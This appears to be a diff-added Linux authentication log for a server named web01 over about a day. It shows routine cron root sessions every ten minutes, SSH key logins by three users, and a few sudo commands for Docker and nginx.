+Oct 13 12:04:33 web01 sudo: alice : TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct 13 12:06:40 web01 sshd[21317]: Received disconnect from 10.0.0.35 port 57587:11: disconnected by user
+Oct 13 12:10:11 web01 CRON[5566]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 12:10:12 web01 CRON[1104]: pam_unix(cron:session): session closed for user root
+Oct 13 12:20:34 web01 CRON[42815]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 12:20:35 web01 CRON[18187]: pam_unix(cron:session): session closed for user root
+Oct 13 12:30:20 web01 CRON[29728]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 12:30:21 web01 CRON[2806]: pam_unix(cron:session): session closed for user root
+Oct 13 12:32:33 web01 sshd[42977]: Received disconnect from 10.0.0.21 port 58354:11: disconnected by user
+Oct 13 12:40:40 web01 CRON[19728]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 12:40:41 web01 CRON[38235]: pam_unix(cron:session): session closed for user root
+Oct 13 12:50:14 web01 CRON[35407]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 12:50:15 web01 CRON[32287]: pam_unix(cron:session): session closed for user root
+Oct 13 13:00:25 web01 CRON[8234]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 13:00:26 web01 CRON[23929]: pam_unix(cron:session): session closed for user root
+Oct 13 13:10:03 web01 CRON[51186]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 13:10:04 web01 CRON[1879]: pam_unix(cron:session): session closed for user root
+Oct 13 13:20:49 web01 CRON[16231]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 13:20:50 web01 CRON[34141]: pam_unix(cron:session): session closed for user root
+Oct 13 13:30:39 web01 CRON[18376]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 13:30:40 web01 CRON[39036]: pam_unix(cron:session): session closed for user root
+Oct 13 13:40:29 web01 CRON[19502]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 13:40:30 web01 CRON[56011]: pam_unix(cron:session): session closed for user root
+Oct 13 13:47:06 web01 sshd[32430]: Accepted publickey for bob from 10.0.0.39 port 53264 ssh2: ED25519 SHA256:x
+Oct 13 13:47:07 web01 systemd-logind[27844]: New session 9592 of user bob.
+Oct 13 13:49:06 web01 sudo: bob : TTY=pts/5 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 13 13:50:28 web01 CRON[13085]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 13:50:29 web01 CRON[35166]: pam_unix(cron:session): session closed for user root
+Oct 13 14:00:43 web01 CRON[2734]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 14:00:44 web01 CRON[62818]: pam_unix(cron:session): session closed for user root
+Oct 13 14:10:42 web01 CRON[48786]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 14:10:43 web01 CRON[21599]: pam_unix(cron:session): session closed for user root
+Oct 13 14:17:06 web01 sshd[10424]: Received disconnect from 10.0.0.39 port 39467:11: disconnected by user
+Oct 13 14:20:43 web01 CRON[31227]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 14:20:44 web01 CRON[27474]: pam_unix(cron:session): session closed for user root
+Oct 13 14:30:38 web01 CRON[37267]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 14:30:39 web01 CRON[39014]: pam_unix(cron:session): session closed for user root
+Oct 13 14:40:02 web01 CRON[55796]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 14:40:03 web01 CRON[16381]: pam_unix(cron:session): session closed for user root
+Oct 13 14:50:40 web01 CRON[55372]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 14:50:41 web01 CRON[53849]: pam_unix(cron:session): session closed for user root
+Oct 13 15:00:52 web01 CRON[61741]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 15:00:53 web01 CRON[32622]: pam_unix(cron:session): session closed for user root
+Oct 13 15:10:40 web01 CRON[48927]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 15:10:41 web01 CRON[36575]: pam_unix(cron:session): session closed for user root
+Oct 13 15:11:09 web01 sshd[57664]: Accepted publickey for bob from 10.0.0.31 port 51079 ssh2: ED25519 SHA256:x
+Oct 13 15:11:10 web01 systemd-logind[44436]: New session 7871 of user bob.
+Oct 13 15:13:09 web01 sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Oct 13 15:18:15 web01 sshd[33658]: Accepted publickey for alice from 10.0.0.37 port 41802 ssh2: ED25519 SHA256:x
+Oct 13 15:18:16 web01 systemd-logind[46058]: New session 5039 of user alice.
+Oct 13 15:20:11 web01 CRON[32416]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 15:20:12 web01 CRON[56953]: pam_unix(cron:session): session closed for user root
+Oct 13 15:30:46 web01 CRON[63323]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 15:30:47 web01 CRON[19091]: pam_unix(cron:session): session closed for user root
+Oct 13 15:40:19 web01 CRON[38738]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 15:40:20 web01 CRON[11717]: pam_unix(cron:session): session closed for user root
+Oct 13 15:41:09 web01 sshd[2670]: Received disconnect from 10.0.0.31 port 43490:11: disconnected by user
+Oct 13 15:48:15 web01 sshd[25869]: Received disconnect from 10.0.0.37 port 55335:11: disconnected by user
+Oct 13 15:50:56 web01 CRON[31862]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 15:50:57 web01 CRON[35931]: pam_unix(cron:session): session closed for user root
+Oct 13 16:00:55 web01 CRON[21189]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 16:00:56 web01 CRON[56448]: pam_unix(cron:session): session closed for user root
+Oct 13 16:10:25 web01 CRON[36399]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 16:10:26 web01 CRON[31514]: pam_unix(cron:session): session closed for user root
+Oct 13 16:16:36 web01 sshd[36006]: Failed password for bob from 10.0.0.16 port 51602 ssh2
+Oct 13 16:16:41 web01 sshd[61249]: Accepted publickey for bob from 10.0.0.16 port 56196 ssh2: ED25519 SHA256:x
+Oct 13 16:16:42 web01 systemd-logind[25451]: New session 9113 of user bob.
+Oct 13 16:18:41 web01 sudo: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 13 16:20:37 web01 CRON[37211]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 16:20:38 web01 CRON[35551]: pam_unix(cron:session): session closed for user root
+Oct 13 16:26:53 web01 sshd[49886]: Accepted publickey for bob from 10.0.0.14 port 46941 ssh2: ED25519 SHA256:x
+Oct 13 16:26:54 web01 systemd-logind[29751]: New session 4599 of user bob.
+Oct 13 16:30:26 web01 CRON[29494]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 16:30:27 web01 CRON[3063]: pam_unix(cron:session): session closed for user root
+Oct 13 16:37:03 web01 sshd[12086]: Accepted publickey for bob from 10.0.0.34 port 58557 ssh2: ED25519 SHA256:x
+Oct 13 16:37:04 web01 systemd-logind[25828]: New session 4414 of user bob.
+Oct 13 16:40:09 web01 CRON[23280]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 16:40:10 web01 CRON[45673]: pam_unix(cron:session): session closed for user root
+Oct 13 16:46:41 web01 sshd[58010]: Received disconnect from 10.0.0.16 port 44271:11: disconnected by user
+Oct 13 16:50:06 web01 CRON[64566]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 16:50:07 web01 CRON[41401]: pam_unix(cron:session): session closed for user root
+Oct 13 16:56:53 web01 sshd[34692]: Received disconnect from 10.0.0.14 port 37079:11: disconnected by user
+Oct 13 17:00:24 web01 CRON[23507]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 17:00:25 web01 CRON[7946]: pam_unix(cron:session): session closed for user root
+Oct 13 17:07:03 web01 sshd[42435]: Received disconnect from 10.0.0.34 port 59970:11: disconnected by user
+Oct 13 17:10:54 web01 CRON[58306]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 17:10:55 web01 CRON[51669]: pam_unix(cron:session): session closed for user root
+Oct 13 17:20:35 web01 CRON[62344]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 17:20:36 web01 CRON[17100]: pam_unix(cron:session): session closed for user root
+Oct 13 17:30:14 web01 CRON[25168]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 17:30:15 web01 CRON[18376]: pam_unix(cron:session): session closed for user root
+Oct 13 17:40:10 web01 CRON[42135]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 17:40:11 web01 CRON[30057]: pam_unix(cron:session): session closed for user root
+Oct 13 17:50:58 web01 CRON[15341]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 17:50:59 web01 CRON[56463]: pam_unix(cron:session): session closed for user root
+Oct 13 18:00:21 web01 CRON[8047]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 18:00:22 web01 CRON[33519]: pam_unix(cron:session): session closed for user root
+Oct 13 18:10:19 web01 CRON[5487]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 18:10:20 web01 CRON[42246]: pam_unix(cron:session): session closed for user root
+Oct 13 18:20:02 web01 CRON[37679]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 18:20:03 web01 CRON[61358]: pam_unix(cron:session): session closed for user root
+Oct 13 18:30:07 web01 CRON[15027]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 18:30:08 web01 CRON[46247]: pam_unix(cron:session): session closed for user root
+Oct 13 18:40:44 web01 CRON[60081]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 18:40:45 web01 CRON[16085]: pam_unix(cron:session): session closed for user root
+Oct 13 18:50:12 web01 CRON[34142]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 18:50:13 web01 CRON[52587]: pam_unix(cron:session): session closed for user root
+Oct 13 19:00:27 web01 CRON[39259]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 19:00:28 web01 CRON[43715]: pam_unix(cron:session): session closed for user root
+Oct 13 19:10:26 web01 CRON[45662]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 19:10:27 web01 CRON[55408]: pam_unix(cron:session): session closed for user root
+Oct 13 19:20:55 web01 CRON[7248]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 19:20:56 web01 CRON[58123]: pam_unix(cron:session): session closed for user root
+Oct 13 19:30:54 web01 CRON[63232]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 19:30:55 web01 CRON[64407]: pam_unix(cron:session): session closed for user root
+Oct 13 19:40:02 web01 CRON[53974]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 19:40:03 web01 CRON[2116]: pam_unix(cron:session): session closed for user root
+Oct 13 19:50:08 web01 CRON[45552]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 19:50:09 web01 CRON[15852]: pam_unix(cron:session): session closed for user root
+Oct 13 20:00:36 web01 CRON[48765]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 20:00:37 web01 CRON[1720]: pam_unix(cron:session): session closed for user root
+Oct 13 20:10:22 web01 CRON[37846]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 20:10:23 web01 CRON[59492]: pam_unix(cron:session): session closed for user root
+Oct 13 20:20:53 web01 CRON[33015]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 20:20:54 web01 CRON[35207]: pam_unix(cron:session): session closed for user root
+Oct 13 20:30:39 web01 CRON[4305]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 20:30:40 web01 CRON[14117]: pam_unix(cron:session): session closed for user root
+Oct 13 20:40:04 web01 CRON[64997]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 20:40:05 web01 CRON[34861]: pam_unix(cron:session): session closed for user root
+Oct 13 20:50:20 web01 CRON[55544]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 20:50:21 web01 CRON[33828]: pam_unix(cron:session): session closed for user root
+Oct 13 21:00:08 web01 CRON[23191]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 21:00:09 web01 CRON[36260]: pam_unix(cron:session): session closed for user root
+Oct 13 21:10:34 web01 CRON[63427]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 21:10:35 web01 CRON[52901]: pam_unix(cron:session): session closed for user root
+Oct 13 21:20:17 web01 CRON[21492]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 21:20:18 web01 CRON[36429]: pam_unix(cron:session): session closed for user root
+Oct 13 21:30:53 web01 CRON[31027]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 21:30:54 web01 CRON[17812]: pam_unix(cron:session): session closed for user root
+Oct 13 21:40:06 web01 CRON[30041]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 21:40:07 web01 CRON[19723]: pam_unix(cron:session): session closed for user root
+Oct 13 21:50:07 web01 CRON[63251]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 21:50:08 web01 CRON[3648]: pam_unix(cron:session): session closed for user root
+Oct 13 22:00:02 web01 CRON[63198]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 22:00:03 web01 CRON[14301]: pam_unix(cron:session): session closed for user root
+Oct 13 22:10:48 web01 CRON[47236]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 22:10:49 web01 CRON[19392]: pam_unix(cron:session): session closed for user root
+Oct 13 22:20:47 web01 CRON[19135]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 22:20:48 web01 CRON[6558]: pam_unix(cron:session): session closed for user root
+Oct 13 22:30:56 web01 CRON[44858]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 22:30:57 web01 CRON[9271]: pam_unix(cron:session): session closed for user root
+Oct 13 22:40:14 web01 CRON[10788]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 22:40:15 web01 CRON[48978]: pam_unix(cron:session): session closed for user root
+Oct 13 22:50:56 web01 CRON[12218]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 22:50:57 web01 CRON[7340]: pam_unix(cron:session): session closed for user root
+Oct 13 23:00:33 web01 CRON[10208]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 23:00:34 web01 CRON[24770]: pam_unix(cron:session): session closed for user root
+Oct 13 23:10:46 web01 CRON[42001]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 23:10:47 web01 CRON[18542]: pam_unix(cron:session): session closed for user root
+Oct 13 23:20:48 web01 CRON[5991]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 23:20:49 web01 CRON[12003]: pam_unix(cron:session): session closed for user root
+Oct 13 23:30:40 web01 CRON[18471]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 23:30:41 web01 CRON[64207]: pam_unix(cron:session): session closed for user root
+Oct 13 23:40:33 web01 CRON[27794]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 23:40:34 web01 CRON[17466]: pam_unix(cron:session): session closed for user root
+Oct 13 23:50:27 web01 CRON[2567]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 23:50:28 web01 CRON[29167]: pam_unix(cron:session): session closed for user root
+Oct 14 00:00:01 web01 CRON[30489]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 00:00:02 web01 CRON[63149]: pam_unix(cron:session): session closed for user root
+Oct 14 00:10:21 web01 CRON[60328]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 00:10:22 web01 CRON[27702]: pam_unix(cron:session): session closed for user root
+Oct 14 00:20:50 web01 CRON[47849]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 00:20:51 web01 CRON[48779]: pam_unix(cron:session): session closed for user root
+Oct 14 00:30:24 web01 CRON[23658]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 00:30:25 web01 CRON[31784]: pam_unix(cron:session): session closed for user root
+Oct 14 00:40:40 web01 CRON[5514]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 00:40:41 web01 CRON[33548]: pam_unix(cron:session): session closed for user root
+Oct 14 00:50:58 web01 CRON[48145]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 00:50:59 web01 CRON[18407]: pam_unix(cron:session): session closed for user root
+Oct 14 01:00:06 web01 CRON[32213]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 01:00:07 web01 CRON[23453]: pam_unix(cron:session): session closed for user root
+Oct 14 01:10:32 web01 CRON[23561]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 01:10:33 web01 CRON[4142]: pam_unix(cron:session): session closed for user root
+Oct 14 01:20:14 web01 CRON[30668]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 01:20:15 web01 CRON[28354]: pam_unix(cron:session): session closed for user root
+Oct 14 01:30:56 web01 CRON[60887]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 01:30:57 web01 CRON[8131]: pam_unix(cron:session): session closed for user root
+Oct 14 01:40:55 web01 CRON[35543]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 01:40:56 web01 CRON[44006]: pam_unix(cron:session): session closed for user root
+Oct 14 01:50:06 web01 CRON[6597]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 01:50:07 web01 CRON[60528]: pam_unix(cron:session): session closed for user root
+Oct 14 02:00:07 web01 CRON[41859]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 02:00:08 web01 CRON[14903]: pam_unix(cron:session): session closed for user root
+Oct 14 02:10:30 web01 CRON[54566]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 02:10:31 web01 CRON[51632]: pam_unix(cron:session): session closed for user root
+Oct 14 02:20:25 web01 CRON[64232]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 02:20:26 web01 CRON[58561]: pam_unix(cron:session): session closed for user root
+Oct 14 02:30:57 web01 CRON[51703]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 02:30:58 web01 CRON[46309]: pam_unix(cron:session): session closed for user root
+Oct 14 02:40:28 web01 CRON[57551]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 02:40:29 web01 CRON[22254]: pam_unix(cron:session): session closed for user root
+Oct 14 02:50:15 web01 CRON[22193]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 02:50:16 web01 CRON[52591]: pam_unix(cron:session): session closed for user root
+Oct 14 03:00:18 web01 CRON[53467]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 03:00:19 web01 CRON[36944]: pam_unix(cron:session): session closed for user root
+Oct 14 03:10:05 web01 CRON[21963]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 03:10:06 web01 CRON[32484]: pam_unix(cron:session): session closed for user root
+Oct 14 03:20:14 web01 CRON[40914]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 03:20:15 web01 CRON[53052]: pam_unix(cron:session): session closed for user root
+Oct 14 03:30:53 web01 CRON[3044]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 03:30:54 web01 CRON[1099]: pam_unix(cron:session): session closed for user root
+Oct 14 03:40:08 web01 CRON[7376]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 03:40:09 web01 CRON[24242]: pam_unix(cron:session): session closed for user root
+Oct 14 03:50:12 web01 CRON[39338]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 03:50:13 web01 CRON[42743]: pam_unix(cron:session): session closed for user root
+Oct 14 04:00:17 web01 CRON[34853]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 04:00:18 web01 CRON[24049]: pam_unix(cron:session): session closed for user root
+Oct 14 04:10:40 web01 CRON[18143]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 04:10:41 web01 CRON[34506]: pam_unix(cron:session): session closed for user root
+Oct 14 04:20:57 web01 CRON[27530]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 04:20:58 web01 CRON[54967]: pam_unix(cron:session): session closed for user root
+Oct 14 04:30:34 web01 CRON[10365]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 04:30:35 web01 CRON[37172]: pam_unix(cron:session): session closed for user root
+Oct 14 04:40:11 web01 CRON[64628]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 04:40:12 web01 CRON[18134]: pam_unix(cron:session): session closed for user root
+Oct 14 04:50:00 web01 CRON[16252]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 04:50:01 web01 CRON[51079]: pam_unix(cron:session): session closed for user root
+Oct 14 05:00:27 web01 CRON[35874]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 05:00:28 web01 CRON[21433]: pam_unix(cron:session): session closed for user root
+Oct 14 05:10:01 web01 CRON[49374]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 05:10:02 web01 CRON[63325]: pam_unix(cron:session): session closed for user root
+Oct 14 05:20:05 web01 CRON[61471]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 05:20:06 web01 CRON[33717]: pam_unix(cron:session): session closed for user root
+Oct 14 05:30:27 web01 CRON[17107]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 05:30:28 web01 CRON[24011]: pam_unix(cron:session): session closed for user root
+Oct 14 05:40:35 web01 CRON[42587]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 05:40:36 web01 CRON[37680]: pam_unix(cron:session): session closed for user root
+Oct 14 05:50:26 web01 CRON[46662]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 05:50:27 web01 CRON[22971]: pam_unix(cron:session): session closed for user root
+Oct 14 06:00:14 web01 CRON[37087]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 06:00:15 web01 CRON[22063]: pam_unix(cron:session): session closed for user root
+Oct 14 06:10:12 web01 CRON[5887]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 06:10:13 web01 CRON[48595]: pam_unix(cron:session): session closed for user root
+Oct 14 06:20:56 web01 CRON[12926]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 06:20:57 web01 CRON[16282]: pam_unix(cron:session): session closed for user root
+Oct 14 06:30:20 web01 CRON[36420]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 06:30:21 web01 CRON[8315]: pam_unix(cron:session): session closed for user root
+Oct 14 06:40:34 web01 CRON[7342]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 06:40:35 web01 CRON[64278]: pam_unix(cron:session): session closed for user root
+Oct 14 06:50:26 web01 CRON[64646]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 06:50:27 web01 CRON[44106]: pam_unix(cron:session): session closed for user root
+Oct 14 07:00:05 web01 CRON[9544]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 07:00:06 web01 CRON[11307]: pam_unix(cron:session): session closed for user root
+Oct 14 07:10:20 web01 CRON[58413]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 07:10:21 web01 CRON[3310]: pam_unix(cron:session): session closed for user root
+Oct 14 07:20:12 web01 CRON[17021]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 07:20:13 web01 CRON[27867]: pam_unix(cron:session): session closed for user root
+Oct 14 07:30:47 web01 CRON[57758]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 07:30:48 web01 CRON[14955]: pam_unix(cron:session): session closed for user root
+Oct 14 07:40:50 web01 CRON[61116]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 07:40:51 web01 CRON[50479]: pam_unix(cron:session): session closed for user root
+Oct 14 07:50:43 web01 CRON[45193]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 07:50:44 web01 CRON[26338]: pam_unix(cron:session): session closed for user root
+Oct 14 08:00:07 web01 CRON[16957]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 08:00:08 web01 CRON[37642]: pam_unix(cron:session): session closed for user root
+Oct 14 08:10:14 web01 CRON[64137]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 08:10:15 web01 CRON[61445]: pam_unix(cron:session): session closed for user root
+Oct 14 08:20:14 web01 CRON[41676]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 08:20:15 web01 CRON[21665]: pam_unix(cron:session): session closed for user root
+Oct 14 08:30:47 web01 CRON[24861]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 08:30:48 web01 CRON[20886]: pam_unix(cron:session): session closed for user root
+Oct 14 08:40:15 web01 CRON[52900]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 08:40:16 web01 CRON[42869]: pam_unix(cron:session): session closed for user root
+Oct 14 08:50:52 web01 CRON[32188]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 08:50:53 web01 CRON[22258]: pam_unix(cron:session): session closed for user root
+Oct 14 09:00:51 web01 CRON[6655]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 09:00:52 web01 CRON[57368]: pam_unix(cron:session): session closed for user root
+Oct 14 09:10:02 web01 CRON[55754]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 09:10:03 web01 CRON[5291]: pam_unix(cron:session): session closed for user root
+Oct 14 09:20:26 web01 CRON[47724]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 09:20:27 web01 CRON[30178]: pam_unix(cron:session): session closed for user root
+Oct 14 09:28:13 web01 sshd[62811]: Accepted publickey for alice from 10.0.0.32 port 47042 ssh2: ED25519 SHA256:x
+Oct 14 09:28:14 web01 systemd-logind[49821]: New session 1751 of user alice.
+Oct 14 09:30:05 web01 CRON[42810]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 09:30:06 web01 CRON[42745]: pam_unix(cron:session): session closed for user root
+Oct 14 09:40:01 web01 CRON[34533]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 09:40:02 web01 CRON[51272]: pam_unix(cron:session): session closed for user root
+Oct 14 09:50:07 web01 CRON[42204]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 09:50:08 web01 CRON[37821]: pam_unix(cron:session): session closed for user root
+Oct 14 09:58:13 web01 sshd[45373]: Received disconnect from 10.0.0.32 port 49568:11: disconnected by user
+Oct 14 10:00:55 web01 CRON[51509]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 10:00:56 web01 CRON[24936]: pam_unix(cron:session): session closed for user root
+Oct 14 10:10:46 web01 CRON[11818]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 10:10:47 web01 CRON[41991]: pam_unix(cron:session): session closed for user root
+Oct 14 10:20:28 web01 CRON[37582]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 10:20:29 web01 CRON[30882]: pam_unix(cron:session): session closed for user root
+Oct 14 10:30:26 web01 CRON[47429]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 10:30:27 web01 CRON[19097]: pam_unix(cron:session): session closed for user root
+Oct 14 10:40:00 web01 CRON[44879]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 10:40:01 web01 CRON[1138]: pam_unix(cron:session): session closed for user root
+Oct 14 10:50:13 web01 CRON[55205]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 10:50:14 web01 CRON[21647]: pam_unix(cron:session): session closed for user root
+Oct 14 10:51:29 web01 sshd[12871]: Accepted publickey for carol from 10.0.0.27 port 41786 ssh2: ED25519 SHA256:x
+Oct 14 10:51:30 web01 systemd-logind[19281]: New session 6615 of user carol.
